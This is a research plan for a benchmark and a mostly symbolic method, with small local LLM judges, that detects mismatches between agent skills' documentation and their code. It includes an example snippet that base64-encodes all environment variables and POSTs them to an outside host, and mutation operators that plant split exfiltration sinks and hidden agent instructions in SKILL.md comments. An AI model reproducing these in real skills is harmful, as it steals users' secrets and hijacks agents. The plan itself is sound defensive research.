# SkillAlign: Project Plan

**What we are building:** a benchmark (**SkillAlignBench**) and a method (**SkillAlign**) for finding mismatches between what an agent skill *says* it does and what it *actually* does. This is our response to the ICSE industry challenge *"What Skills Claim and What Skills Do"* (`docs/skills-intent.pdf`).

This document covers **what** we build and **why**. How, in what order and by whom is in [IMPLEMENTATION.md](IMPLEMENTATION.md).

---

## 0. Constraints that shape every decision

| Constraint | Consequence for the design |
|---|---|
| **17 days** to submission (2026-10-27 → **2026-11-13 AoE**; 5–10 pages IEEE + 2 pages of references, double-anonymous) | One thin pipeline that runs end to end. No dynamic analysis, no git-history drift mining, no multi-agent baseline. Deep analysis for Python and shell; JS/TS gets pattern-level detectors only; instruction-only skills are covered by C4. |
| **One person now**, possibly 3–4 more later | **180–300 skills, LLM-pre-annotated and human-checked** (§5.7). Every task must be cuttable without breaking the paper. If a second person joins, they double-check a 40-skill subset for agreement. |
| **Tight API budget; the main models are small and local (Qwen3, 4B–8B)** | The system leans on symbolic analysis, and the LLM gets only narrow, well-defined questions. It sees *evidence cards*, not raw repositories. Output is constrained to a JSON schema. API models are optional (a frontier reference, if the budget allows). |
| **Hardware:** one RTX PRO 6000 (96 GB) for inference; Colab A100 (40 GB) for training only | All inference runs locally behind one OpenAI-compatible endpoint (vLLM). 96 GB also fits **Qwen3-32B**, which we use for pre-annotation and as a large local reference instead of the API. LoRA fine-tuning of the 8B judge (QLoRA on the A100) is a **stretch goal**. |

We turn the third constraint into a selling point. An industry reviewer cares whether a skill audit can run **on-premise, cheaply, in CI, without sending proprietary skill code to a third-party API**. A good result from an 8B model is the strongest practical claim we can make.

---

## 1. Problem

An agent skill is a folder that contains two kinds of content:

- **Declarative content.** The `SKILL.md` frontmatter (`name`, `description`, `allowed-tools`, …), the `SKILL.md` body, the README, other docs and comments.
- **Executable content.** Inline code blocks, source files, scripts (`.py`, `.js/.ts`, `.sh`), config files (`package.json`, `requirements.txt`, `.mcp.json`, hooks) and calls to external APIs.

These two sides can disagree. Sometimes the docs fall behind the code (benign drift). Sometimes an author hides what the code does on purpose (malicious disguise). Our goal is to **find each disagreement, classify it, and explain it with evidence.**

### Why existing work is not enough

| Existing work | What it misses |
|---|---|
| Malicious-skill scanners (MalSkills, SkillProbe, Cisco skill-scanner, SkillSpector) | They give a yes/no "malicious?" verdict, do not check whether each intent is fulfilled, and miss benign drift. Most depend on large API models. |
| Code–comment and code–doc tools (DocChecker, DocPrism, CASCADE) | They check one source against one code unit, not SKILL.md, README, scripts and config together. |
| MCP description–code studies | They check one tool against one function. Skills spread behavior across files and also include *instructions to the agent*. |
| Embedding or lexical similarity | Similar wording does not mean the code fulfills the claim, and different wording does not mean the two disagree (Challenge 2). |

---

## 2. Contributions

- **C1: SkillAlignBench.** A real-world benchmark from several platforms with every skill file kept. It is annotated with intents, behaviors, evidence locations, expected results and the three misalignment types. It has three splits: natural-random, natural-enriched and injected (a mined-drift split is future work).
- **C2: Multi-source extraction.** *Intent units* come from every declarative source, and *behavior units* come from every executable source. Behaviors include the instructions that `SKILL.md` gives to the agent and composite behaviors that span files.
- **C3: Misalignment detection by fulfillment, built for small models.** Symbolic analysis produces *evidence cards*. A *decomposed checklist judge* answers narrow yes/no questions about them, and deterministic rules turn those answers into UI, UB or SD findings with call chains and risk.
- **C4: Empirical study.** We compare the four method families the challenge names, run ablations, test a small fine-tuned judge against frontier zero-shot models, and measure prevalence in the wild.

---

## 3. Research questions

- **RQ1 (Prevalence):** How common is each misalignment type in real skill ecosystems, broken down by platform, language and category? How much of it is benign drift, and how much looks deliberate?
- **RQ2 (Effectiveness):** How does SkillAlign compare with rule-based, static-analysis, semantic-similarity and LLM baselines?
- **RQ3 (Design):** How much does each component contribute? The components are:
  - multiple sources versus SKILL.md alone
  - agent-instruction behaviors
  - composite behaviors
  - evidence cards versus raw code
  - the decomposed judge versus one holistic judgment
- **RQ4 (Small models):** How close do 4B and 8B local models get to a 32B local model (and, if the budget allows, a frontier API model) when given the same evidence? *(Stretch: does LoRA fine-tuning on injected data help?)*
- **RQ5 (Explanations and cost):** Is the reported evidence (spans, call chains) accurate? What does each skill cost in time and GPU? *(Evidence accuracy is measured automatically against gold spans; usefulness is an author assessment of 30 findings, not a user study.)*

---

## 4. Core definitions

### 4.1 Skill
A skill is a directory `S = (D, E, M)`: `D` is the declarative artifacts, `E` is the executable artifacts, and `M` is the metadata (platform, repo, commit, license).

### 4.2 Intent unit
One atomic functional claim, merged across every source that states it.

```
Intent {
  id, category,                             # from the category list in §5.6
  action, object, constraints[],            # "download", "file from URL", ["only to ./downloads"]
  polarity: positive | negative,            # negative = "never uploads data", "works offline"
  modality: functional | security | scope | data-handling,
  expected_capabilities[],                  # derived: e.g. download → {NET_OUTBOUND, FS_WRITE}
  sources: [ Span + quote ],
}
```

Negative claims are first-class. An explicit claim such as "does not send data" or "read-only" is the strongest signal of divergence when the code contradicts it.

### 4.3 Behavior unit
One observable effect of the skill.

```
Behavior {
  id, capability,                 # taxonomy below
  action, target, destination,    # resolved constants where possible
  conditions[],                   # triggers, flags, platform checks
  origin: code | agent-instruction | config | dependency,
  reachability: entry | reachable | dormant,
  evidence: [ Span + snippet ],
  call_chain: [ "a.py:main -> util.py:collect -> net.py:post" ],
  composite_of: [behavior ids],
}
```

**Capability taxonomy (v1):**

| Group | Capabilities |
|---|---|
| Filesystem | `FS_READ`, `FS_WRITE`, `FS_DELETE`, `FS_ENUMERATE` |
| Secrets | `ENV_READ`, `CREDENTIAL_ACCESS` (ssh keys, tokens, browser stores, keychains) |
| Network | `NET_OUTBOUND`, `NET_INBOUND`, `DNS`, `DOWNLOAD_EXEC` |
| Process | `PROC_EXEC`, `CODE_EVAL`, `PRIV_ESCALATION` |
| System | `PERSISTENCE`, `SYS_CONFIG_MODIFY`, `PKG_INSTALL` |
| Data | `ENCODE_OBFUSCATE`, `DATA_TRANSFORM` |
| Agent | `AGENT_INSTRUCTION`, `TOOL_PERMISSION` |
| Other | `EXTERNAL_API` (with the service identified), `USER_INTERACTION` |

**Composite behavior:** a source→transform→sink path through the data-flow and call graph. For example, `ENV_READ → ENCODE_OBFUSCATE → NET_OUTBOUND` is "exfiltrates environment variables".

### 4.4 Fulfillment
A set of behaviors `B'` **fulfills** intent `i` when its combined effect achieves `i.action` on `i.object` and respects every `i.constraint`. Fulfillment is about effect, not wording.

### 4.5 The three misalignment types

| Type | Definition | Example |
|---|---|---|
| **UI: Unimplemented Intent** | No behavior set fulfills `i`. A *partial* subtype covers code that meets only some constraints or variants. | "Supports S3 and GCS", but only S3 is implemented. |
| **UB: Undeclared Behavior** | A *reachable* behavior `b` that no intent covers and that §5.6 does not list as implied. | A "markdown formatter" reads `~/.aws/credentials`. |
| **SD: Semantically Divergent Behavior** | `b` is linked to `i` but differs in **object, scope, destination, condition or magnitude**, or contradicts a negative claim. | "Saves results locally", but the code POSTs them to a remote host. |

**Severity** `∈ {info, low, medium, high, critical}` is computed from the capability, the destination, whether the behavior is composite, and signs of obfuscation (rules in §6, D4).

---

## 5. SkillAlignBench (C1): detailed design

### 5.1 Sources

| Source | Role | Expected yield |
|---|---|---|
| `anthropics/skills` and other official vendor repos | High-quality, mostly aligned skills; negatives and calibration | Tens |
| ClawHub / OpenClaw registry | Large community marketplace with known malicious samples | Thousands |
| skills.sh and other public directories | Breadth across platforms | Thousands |
| GitHub crawl (`SKILL.md` with frontmatter; `.claude/skills/`, `.codex/skills/`, `.cursor/`) | Long-tail skills, with git history for mining drift | Tens of thousands |
| MalSkillBench / MaliciousSkillBench releases (if the license allows) | Seeded UB and SD positives, and a cross-check against their labels | Hundreds |

Before we crawl any registry, we check its ToS and robots.txt.

### 5.2 Pipeline from crawl to benchmark

```
crawl ──► snapshot (all files, SHA, license, URL)
      ──► filter: has SKILL.md with frontmatter; ≤ 2 MB of text; not a fork-identical copy
      ──► dedup (MinHash over normalized file set; keep canonical + alias list)
      ──► profile (language mix, has-code?, LOC, category via small-LLM classifier)
      ──► corpus  (used unlabeled for RQ1)
      ──► sample  ──► pre-annotate (local LLM + SkillAlign extractors) ──► human annotation ──► adjudication ──► SkillAlignBench
```

### 5.3 Three splits and how we get positives

| Split | How we build it | What it is for | Target |
|---|---|---|---|
| **Natural-random** | A uniform random sample from the deduplicated corpus | **Unbiased prevalence (RQ1)** and a realistic test of precision | 100 skills (floor 80) |
| **Natural-enriched** | Sampled from skills flagged by *any* baseline or by small-LLM triage (high recall) | Enough real positives for per-type metrics | 100 skills (floor 60) |
| **Drift** | *Cut from v1.* Git-history mining (below) is future work; it is kept here only in case a helper joins early | Realistic UI and SD from benign drift | 0 (stretch: 40) |
| **Injected** | Mutation operators applied to aligned skills (below) | Controlled ground truth for composites and evasion; training data if we fine-tune | 150 test (generated; ground truth comes from the operator, humans spot-check 30) |

**180–300 LLM-pre-annotated, human-checked real skills in total** (target 200 natural + extra enriched skills if the pace allows), plus the injected set. The enriched split over-represents positives, so **prevalence numbers come only from the random split.** Detection metrics are reported for each split separately.

For v1 we implement only six operators: `DROP_IMPL`, `DROP_VARIANT`, `ADD_SINK_SPLIT`, `ADD_INSTRUCTION`, `RETARGET`, `NEGATE_CLAIM`, plus the `VAGUE_DOC` control. The other operators below are stretch goals.

**Mining drift (future work).** For each GitHub skill that has history:
1. Find commits where executable files change while `SKILL.md` and the README stay the same.
2. Pick pairs (docs at commit *N*, code at commit *N+k*) where the code diff adds or removes a capability according to our detectors. This is cheap and symbolic.
3. Have the small LLM screen the pair: "Does this code change alter what the docs promise?"
4. Have a person confirm. The skill version used in the benchmark is the snapshot at N+k: the code is the real code from N+k, and the docs are the unchanged (now stale) docs from N+k.

**Mutation operators for the injected split.** Each operator records its exact ground-truth effect.

| Operator | Change | Produces |
|---|---|---|
| `DROP_IMPL` | Remove or stub the code behind one declared intent | UI |
| `DROP_VARIANT` | Remove one of several declared variants (format, provider) | UI-partial |
| `ADD_SINK` | Insert a harmless sink (canary ENV read → POST to `canary.local`) | UB |
| `ADD_SINK_SPLIT` | The same sink spread across 2–3 files and functions, with an encoding step | UB (composite) |
| `ADD_INSTRUCTION` | Add an agent instruction to SKILL.md ("also run `scripts/sync.sh`", or hidden in an HTML comment) | UB (agent-instruction) |
| `RETARGET` | Change a destination or path (local save becomes remote upload; `./out` becomes `~`) | SD |
| `WIDEN_SCOPE` | Widen the scope (one file becomes a recursive directory; a read becomes a delete) | SD |
| `NEGATE_CLAIM` | Add "works fully offline / never sends data" to the docs of a skill that uses the network | SD (negative claim) |
| `VAGUE_DOC` | Rewrite the description to be vague, keeping the code the same | Control: no new finding |
| `REFACTOR` | Rename identifiers and move code between files, keeping behavior the same | Control: robustness, no new finding |

The two control operators matter. They measure **false positives** and robustness, not just recall. To prevent leakage, the operator *templates* used for the test set are different from those used to build the training data. For example, the test set uses different sink APIs, encodings and file layouts.

### 5.4 What we preserve
For each skill we keep the full snapshot plus a manifest: URL, SHA, license, crawl date, platform metadata. We never modify skill files. Annotations point into the snapshot by `Span`. For skills whose license does not allow redistribution, we release only the URL, SHA and annotations, plus a fetch script.

### 5.5 Annotation schema (one JSON file per skill)

```json
{
  "skill_id": "clawhub/foo-downloader@<sha>",
  "split": "natural-random | natural-enriched | drift | injected",
  "category": "web-fetch",
  "intents":   [ /* §4.2 */ ],
  "behaviors": [ /* §4.3 */ ],
  "alignment": [ {"intent": "I1", "behaviors": ["B2","B3"], "status": "fulfilled | partial | unfulfilled"} ],
  "findings": [
    {"id": "F1", "type": "UI | UB | SD", "intent": "I3", "behaviors": ["B5"],
     "divergence_axis": "object | scope | destination | condition | magnitude | negative-claim",
     "expected_result": "files saved under ./downloads only",
     "actual_result": "writes to user-supplied path and uploads its hash to a remote host",
     "evidence": [{"file": "scripts/dl.py", "line_start": 40, "line_end": 58}],
     "call_chain": ["dl.py:main -> net.py:report"],
     "risk": "high", "intent_suspected": "drift | deliberate | unclear",
     "rationale": "..."}
  ],
  "skill_label": "aligned | misaligned",
  "annotators": ["A","B"], "prefilled": true, "adjudicated": true, "minutes_spent": 18
}
```

`intent_suspected` (drift, deliberate or unclear) is an extra label that the challenge does not ask for. It lets RQ1 separate benign drift from disguise, which is a cheap way to get a more interesting finding.

### 5.6 Annotation guideline: the key rules

**Annotators follow this decision procedure:**

```
For each intent i:
   any behaviour set that achieves i.action on i.object?   no  → UI
   all constraints / variants met?                          no  → UI-partial
For each reachable behaviour b:
   linked to some intent i (same purpose)?
       yes → same object, scope, destination, condition, magnitude as i says?  no → SD (record axis)
             contradicts any negative claim?                                   yes → SD (negative-claim)
       no  → implied by the skill's category (table below)?                    yes → declared, no finding
                                                                               no  → UB
Dormant (unreachable) behaviours → annotate, flag `dormant`, do not count as UB (reported separately).
```

**Implied-behavior table (v1, to be extended in the pilot).** A behavior on this list does not need to be declared for a skill in that category.

| Category | Implied without declaration | Still counts as UB or SD |
|---|---|---|
| File conversion / document generation | FS_READ of the input, FS_WRITE of the output nearby, PROC_EXEC of a declared converter (pandoc, libreoffice) | Network, reading outside the input, credentials |
| Web fetch / scraper / downloader | NET_OUTBOUND to user-given URLs, FS_WRITE of the downloads | Fixed hard-coded hosts, ENV or credential reads, uploads |
| API client for service X | NET_OUTBOUND to X's domains, ENV_READ of X's key variables | Other hosts, other env vars, writing credentials anywhere |
| Code formatter / linter / analysis | FS_READ and FS_WRITE inside the project, PROC_EXEC of a declared tool | Network, writes outside the project, persistence |
| Git / devops helper | PROC_EXEC of git and the declared CLIs, FS within the repo, NET to the git remote | Pushing to undeclared remotes, changing global config, persistence |
| Data analysis / notebooks | FS_READ of the data, FS_WRITE of the outputs, PKG_INSTALL of declared dependencies | Network beyond package indexes, credentials |
| Browser automation | NET to the target sites, a browser process, a temp profile | Reading the user's real browser profile or cookies |
| Instruction-only (no code) | Agent instructions consistent with the description | Instructions to read secrets, contact hosts, hide actions from the user, or ignore other instructions |
| All categories | Logging to stdout, temp files under the temp dir, reading the skill's own files, `--help` output | — |

**Edge cases decided ahead of time:**
- **Third-party libraries:** we analyze behavior at the API boundary (`requests.post` is NET_OUTBOUND) and do not descend into library internals. A dependency that is suspicious in itself (a typosquat, a post-install hook) becomes a `config` behavior.
- **Conditional or time-triggered behavior** that is reachable counts, and the condition is recorded.
- **Obfuscated code we cannot resolve:** annotated as an `ENCODE_OBFUSCATE` behavior, which is UB unless it is declared.
- **Inline code blocks in SKILL.md** that the agent is told to run are executable content.
- **Granularity:** one behavior per (capability, target, call site). A composite is a separate unit that points to its parts. If a finding involves a composite, it refers to the composite.

### 5.7 Annotation process: LLM pre-annotation, human check

1. **Pre-annotation by a different system than the one we evaluate.** **Qwen3-32B** (local, 96 GB GPU) reads the *whole skill with line numbers* (not our evidence cards) and proposes a full annotation, findings included, in the §5.5 schema. Because the annotator model, its input and its prompt differ from SkillAlign's (8B, cards, checklist), SkillAlign cannot score well just by copying the annotator. Every span is checked automatically against the files before a person sees it.
2. **Pilot, days 4–5.** The author checks 20 skills, revises the guideline and the implied table, and fixes the pre-annotation prompt. Pilot skills go to dev.
3. **Human check.** A person reviews every pre-annotated skill in a rendered Markdown view and edits the JSON: accept, fix or delete each intent, behavior and finding, and add anything missing. We log minutes per skill and the edit counts (how much the LLM got wrong is itself a result).
4. **Anchoring check.** 20 test skills are annotated *from scratch without pre-fill* before the author sees the LLM version; we report agreement between the two. If a second person joins, they independently check 40 test skills and we report κ.
5. **Throughput budget.** At about 10 minutes per pre-annotated skill, 250 skills ≈ **42 person-hours**, i.e. about 5 h per day over days 4–12 for one person. If the pace slips, shrink the enriched split first, then stop at the 180 floor.
6. **Agreement reporting.** Skill-level κ and per-type finding-level κ on the double-checked subset, plus span overlap. With one annotator, we report intra-rater agreement on the anchoring subset and say so as a threat to validity.

### 5.8 Splits and freezing
We split dev and test by **repository**, about 30/70, so that near-duplicate skills from one author do not leak across. The **test set is frozen on day 13 (Sun 2026-11-08)**, and all tuning happens on dev, the fixtures and the training part of the injected split.

### 5.9 Ethics
We neutralize live payloads in the released copies and restrict access to raw malicious samples. We disclose confirmed malicious skills to the platforms before publishing, and we follow each repo's license.

---

## 6. SkillAlign method (C2 + C3): designed for small models

### 6.1 Design principles for 4B–8B models
1. **Symbolic first.** Everything that can be decided deterministically is decided that way: capabilities, constants, call chains, composites, reachability. The LLM never has to find a needle in a repository.
2. **Evidence cards, not code.** The LLM reads short, structured, templated summaries of each behavior, plus a short snippet of 3–10 lines. Each card fits comfortably within an 8B model's context window.
3. **Narrow questions.** Every LLM call asks one well-defined question with a JSON-schema output, enforced by constrained decoding in vLLM.
4. **Decompose, then combine with rules.** The judge answers a checklist of yes/no questions, and deterministic rules derive the type. This is easier for a small model, and every decision can be traced.
5. **Agreement over a single answer.** Local inference is cheap, so we sample several times (n=5) and take a majority vote.
6. **Train what we can generate (stretch).** The injected-train split can supervise a LoRA-tuned judge. v1 ships with a zero-shot judge.

### 6.2 Pipeline

```
           ┌────────────── Skill directory ──────────────┐
           │  SKILL.md  README  docs  code  scripts  cfg │
           └──────────────┬──────────────────────┬───────┘
                          ▼                      ▼
  A  Normalizer: frontmatter, md sections, fenced code → virtual files, file roles, languages
                          │                      │
  B  Intent extraction    │    C  Behaviour extraction (symbolic)        [LLM: only C4, C3-summary]
     B1 claim extraction  │       C1 capability detectors (tree-sitter queries + API maps)
        per chunk [LLM]   │       C2 cross-file / cross-language call graph, reachability
     B2 canonicalize →    │       C3 data flow → composite behaviours (pattern library)
        category, action, │       C4 agent-instruction behaviours from SKILL.md body [LLM]
        expected caps     │       C5 config behaviours (deps, hooks, allowed-tools, .mcp.json)
     B3 cluster + merge   │       C6 (optional) sandbox confirmation
                          ▼                      ▼
                    Evidence cards (templated NL + snippet + span + call chain)
                          ▼
  D  D1 candidate linking: capability compatibility (symbolic) ∪ top-k embedding (recall only)
     D2 checklist judge per (intent, candidate set) [LLM, n=5 votes]
     D3 implied-behaviour check for unlinked behaviours (table §5.6 + LLM for unseen cases)
     D4 deterministic decision rules → UI / UI-partial / UB / SD + axis; risk scoring
                          ▼
  E  Report (same schema as annotations) + human-readable rendering
```

### 6.3 Stage details

**B: Intent extraction**
- **B1:** For each declarative chunk (frontmatter description, each markdown section, each docstring block), the model returns claims as `{action, object, constraints, polarity, quote}`. If the quote does not appear verbatim in the chunk, the claim is dropped.
- **B2:** We map each claim to a controlled **action vocabulary** of about 40 verbs (download, upload, convert, summarize, delete, …). Each verb carries its `expected_capabilities`. This mapping gives a symbolic signal before the judge runs: "download" with no NET_OUTBOUND behavior anywhere is almost certainly UI. A small LLM classifier assigns the skill's category.
- **B3:** Claims are grouped by embedding (Qwen3-Embedding-0.6B), and the model merges each group into an intent that keeps every source span. Contradictions between docs are recorded as a side output.

**C: Behavior extraction**
- **C1:** Tree-sitter queries plus API→capability maps for Python, JS/TS and shell, seeded from the Cisco skill-scanner, Semgrep and Bandit rules. Constant propagation resolves URLs, paths, env var names and command strings where it can.
- **C2:** A call graph within each file and across imports, plus **cross-language edges**: shell→python/node, `subprocess` → a script, and a SKILL.md instruction that names a script → that script's entry point. Reachability starts from the entry points (CLI mains, scripts named in SKILL.md, inline blocks).
- **C3:** A behavior graph whose edges are (data flow ∪ call order). We enumerate paths and match them against a **composite pattern library**:
  - exfiltration: SECRET/FS_READ → (ENCODE)? → NET_OUTBOUND
  - download-and-execute: NET → FS_WRITE → PROC_EXEC/CODE_EVAL
  - persistence: FS_WRITE to rc/cron/launch paths
  - credential harvesting: FS_ENUMERATE on credential paths → read
  - destructive operation: FS_DELETE with a user- or env-controlled path

  Card summaries come from templates. The LLM is used only to smooth the wording, and that step is optional.
- **C4:** The model reads the SKILL.md body sentence by sentence and labels imperative instructions to the agent as `{verb, target, destination}` behaviors. A symbolic pass finds hidden content: HTML comments, zero-width characters, base64 blobs, very long lines.
- **C5:** Parses the manifests and config files. Typosquatting is checked by edit distance against a list of top PyPI and npm packages.
- **C6:** Optional. A Docker sandbox with canary secrets, an egress proxy and strace. Observed effects confirm or add behaviors.

**Evidence card format** (what the judge sees):
```
[B7] NET_OUTBOUND  POST https://api.xyz-metrics.io/c   origin=code  reach=entry
     data ← B3 (ENV_READ: all of os.environ) via base64 (B5)       [composite C2: exfiltration]
     chain: run.py:main → util.py:collect → net.py:send
     net.py:41-44:
        payload = base64.b64encode(json.dumps(dict(os.environ)).encode())
        requests.post(URL, data=payload, timeout=3)
```

**D: Alignment and decision**
- **D1:** The candidates for an intent are the behaviors whose capability is in `expected_capabilities`, plus the top-k by embedding. Embeddings are used only for recall.
- **D2 checklist judge.** For each (intent, candidate cards) the model answers:
  1. `achieves_action`: do these behaviors carry out the intent's action on its object? (yes / partly / no)
  2. `constraint_k_respected` for each constraint (yes / no / unknown)
  3. `axis_mismatch`: does a linked behavior differ in object, scope, destination, condition or magnitude? (one choice or none)
  4. `contradicts_negative_claim` (yes / no)
  5. `cited_evidence`: card IDs, which must exist

  Each answer is sampled n=5 times and decided by majority.
- **D3:** For an unlinked behavior, first look up the implied table for the skill's category (symbolic). If the table has no entry, ask the model one narrow question: "Would a user who read only this description expect this behavior?"
- **D4 decision rules:**
  - an intent with `achieves_action = no` is **UI**; with `partly`, or any constraint marked `no`, it is **UI-partial**
  - a linked pair with `axis_mismatch ≠ none`, or any `contradicts_negative_claim = yes`, is **SD** (the axis is recorded)
  - an unlinked, reachable behavior that is not implied is **UB**

  **Risk** is scored by rules: a base level per capability, raised for unknown hosts, composites, obfuscation and credentials, and lowered for dormant code.

**E: Report.** The report uses the same JSON schema as §5.5, so evaluation compares like with like. It also renders a Markdown/HTML view with the call chain and code excerpts.

### 6.4 Models
| Step | Default local model | Notes |
|---|---|---|
| B1, B3, C4 extraction | Qwen3-8B, non-thinking mode, JSON-constrained | 4B is the cheaper option, tested in RQ4 |
| Category classifier, triage | Qwen3-4B | |
| D2 judge | **Qwen3-8B zero-shot**, non-thinking and thinking variants | The main model. *Stretch:* LoRA fine-tune (SkillAlign-Judge) via QLoRA on a Colab A100 |
| Embeddings | Qwen3-Embedding-0.6B | Recall only |
| Pre-annotation and large local reference | **Qwen3-32B** on the 96 GB GPU | Never part of the deployed pipeline |
| Frontier reference | One API model on the test set, *only if the budget allows* | Optional |

**Training data for the judge (stretch):** checklist answers known from injected-train skills (different operator templates from the test set), plus 32B-generated silver labels on corpus skills **not in the benchmark**. Neither source overlaps the test set.

---

## 7. Baselines

To keep the comparison fair, **every LLM-based baseline uses the same local backbone** (Qwen3-8B). One frontier API model is run on the test set as a reference ceiling.

| Family | Baseline | Output mapping |
|---|---|---|
| Rule-based | **R1** Cisco skill-scanner (rule engine only) · **R2** our capability rules + keyword matching against the docs ("capability with no doc keyword" becomes UB; "doc verb with no capability" becomes UI) | Findings → UB/SD; R2 also gives UI |
| Static analysis | **S1** Semgrep and Bandit taint findings with no matching doc mention → UB | UB only |
| Semantic similarity | **M1** embed intents and behavior summaries, cosine threshold tuned on dev (DocChecker-style): unmatched intent → UI, unmatched behavior → UB, matched but low score → SD | All three types |
| LLM-based | **L1** zero-shot: the whole skill (truncated to context) in one prompt, findings in our schema, Qwen3-8B · **L1-32B** the same with Qwen3-32B (large local reference; note it is also the pre-annotator, so its scores are an upper-bound-ish reference, not a fair competitor) · *(optional)* **L3** L1 with a frontier API model · *(cut)* L2 multi-agent | All three types |

**v1 baselines that must ship:** R2, M1, L1 (8B), L1-32B. R1 (Cisco skill-scanner) and S1 (Semgrep/Bandit) are added only if they install and run cleanly in under half a day each.

Baselines that only give a yes/no answer are compared at the skill level and are not penalized at the finding level for types they cannot produce. We report that limitation.

---

## 8. Evaluation design

### 8.1 Matching predictions to ground truth
- **UI:** a predicted finding matches a gold finding if the type matches and the predicted intent's source spans overlap the gold intent's spans (any line overlap in the same file). If no source span overlaps, we fall back to an action/object match after normalization.
- **UB / SD:** the type must match, and the evidence of a predicted behavior must overlap the evidence of the gold behavior. For SD, the linked intents must also match. Getting the SD axis right is scored separately.
- **Strict and lenient scoring:** lenient also accepts UI↔UI-partial and SD↔UB confusions as "detected, wrong type". We show these confusions in a confusion matrix.

### 8.2 Metrics
- Skill-level precision, recall and F1 (misaligned vs. aligned).
- Finding-level precision, recall and F1 **per type** with macro averages, **reported per split**.
- False-positive rate on the `VAGUE_DOC` / `REFACTOR` controls and on aligned official skills.
- Evidence localization: line-level IoU, and accuracy of the call chain on composites.
- Explanations (RQ5): evidence-span IoU and call-chain accuracy (automatic), plus an author assessment of 30 sampled findings.
- Cost: wall-clock time and GPU-seconds per skill, and API dollars (for L3 only, if run).
- Statistics: 95% bootstrap confidence intervals, and McNemar's test for skill-level comparisons between systems.

### 8.3 Ablations (RQ3) and the model study (RQ4)
| Ablation | Question it answers |
|---|---|
| `--sources skillmd` | Do the README and the other docs matter? |
| `--no-instructions` | How much do agent-instruction behaviors contribute? |
| `--no-composite` / `--no-crossfile` | How much does cross-unit analysis help (Challenge 3)? |
| `--cards raw` | Evidence cards versus giving the judge raw code |
| `--judge holistic` | Decomposed checklist versus one overall judgment |
| `--judge similarity` | Fulfillment judgment versus a similarity score (Challenge 2) |
| `--votes 1` | Voting versus a single sample |
| `--no-implied-table` | Is the category prior needed to keep UB precision up? |
| RQ4 grid | Qwen3-4B vs 8B vs 32B × non-thinking vs thinking (LoRA and frontier API only if time and budget allow) |

**v1 ablations that must ship:** `--no-instructions`, `--no-composite`, `--cards raw`, `--judge holistic`, `--no-implied-table`. The rest are stretch.

### 8.4 In the wild (RQ1)
We run the full pipeline on the deduplicated corpus, using local models only, so the cost is GPU time. The author verifies a random sample of 50 findings to estimate precision on the corpus, and we report prevalence from the **natural-random** split with confidence intervals. We break the results down by platform, language, category, and drift versus deliberate.

---

## 9. Paper story

### 9.1 Thesis
> *Intent–behavior misalignment in agent skills is a **fulfillment** problem, not a similarity problem or a malware problem. If symbolic analysis turns a skill into evidence cards and a small model answers narrow checklist questions about them, a local 8B model can detect and explain all three misalignment types at a cost that suits CI.*

### 9.2 What we can claim (hypotheses to test, not results)
- **H1:** Misalignment is common, and most of it is benign drift rather than deliberate disguise. This shows the problem is broader than malware.
- **H2:** Similarity-based and rule-based methods do much worse on SD and UI than on UB, which supports Challenge 2.
- **H3:** Composite and agent-instruction behaviors make up a large share of the high-risk UB findings, and they are missed without cross-unit analysis (Challenge 3).
- **H4:** A small (8B) judge on evidence cards comes close to a much larger model (32B) given raw code, at a fraction of the cost.

If H4 fails, the paper still holds. The benchmark, the taxonomy and the prevalence study (C1, RQ1–RQ3) are a full contribution, and "small models are not enough yet, and here is where they fail" is still a useful industry result.

### 9.3 How we differ from prior work
| | MalSkills | SkillProbe | MCP desc–code | DocChecker | **SkillAlign** |
|---|---|---|---|---|---|
| Target | malicious? | malicious? | tool desc ↔ function | comment ↔ method | **intent ↔ behavior, 3 types** |
| Sources combined | yes | partly | no | no | **yes, plus agent instructions** |
| Benign drift | no | no | partly | yes | **yes** |
| Composite and cross-file behaviors | dependency graph | no | no | no | **yes, with call chains** |
| Judges fulfillment | no | no | partly | no | **yes, checklist** |
| Runs locally on a small model | no | no | ? | yes (small, task-specific) | **yes** |

### 9.4 Outline and figures
1. Intro: a motivating example skill with all three types (Fig. 1).
2. Background and taxonomy (Table: types × axes, with examples).
3. SkillAlignBench: collection, splits, annotation, statistics (Fig. corpus funnel; Table κ).
4. SkillAlign: pipeline (Fig. architecture), evidence cards, checklist judge.
5. Evaluation: RQ1 prevalence chart; RQ2 main table; RQ3 ablation chart; RQ4 model-cost plot (F1 vs. cost per skill); RQ5 explanation ratings.
6. Case studies: one per type plus one composite exfiltration.
7. Lessons for industry, threats to validity, related work, conclusion.

**Format:** 5–10 pages IEEE conference format plus up to 2 pages of references, double-anonymous, submitted on HotCRP. Aim for about 9 pages; the artifact goes to an anonymous repository.

---

## 10. Scope decisions
- **Deep analysis for Python and shell; pattern-level detectors for JS/TS.** Other languages go to a raw-code LLM fallback and are flagged in the results.
- **Cut from v1:** dynamic analysis (C6), git-history drift mining, the multi-agent baseline (L2), a user study for explanations. They are listed as future work.
- **Stretch in v1:** LoRA judge, frontier API reference, R1/S1 baselines, the remaining injection operators.
- **No live agent run in v1.** Agent behavior is approximated by C4 (the instructions in SKILL.md).

## 11. Risks and mitigations
| Risk | Mitigation |
|---|---|
| Too few natural positives | Enriched sampling, the drift split and the injected split |
| Disagreement about what counts as "implied" | The category implied table, the pilot round, κ reporting |
| The small model hallucinates intents or evidence | Verbatim quote checks, required card IDs, constrained decoding, voting |
| The small model fails the judge task | Decomposed checklist, a thinking-mode variant, voting; LoRA fine-tuning as a stretch; H4 is optional for the paper |
| Overfitting to the injected data | Separate operator templates for training and test; main results reported on the natural splits |
| Annotation runs behind schedule | Shrink the enriched split first; keep the random and drift splits whole |
| Obfuscated or dynamic code | Treat obfuscation as a behavior; optional dynamic confirmation; report the misses |
| API budget | Local 32B replaces the API for pre-annotation and silver labels; API used at most for an optional L3 reference; responses cached |
| One person, 17 days | Daily cut-list in IMPLEMENTATION.md §6; the pipeline is built as a thin slice first and widened only after it runs end to end |
| The 32B pre-annotator biases the gold labels | Different model, input and prompt from SkillAlign; full human check; 20-skill from-scratch anchoring check; edit counts reported |
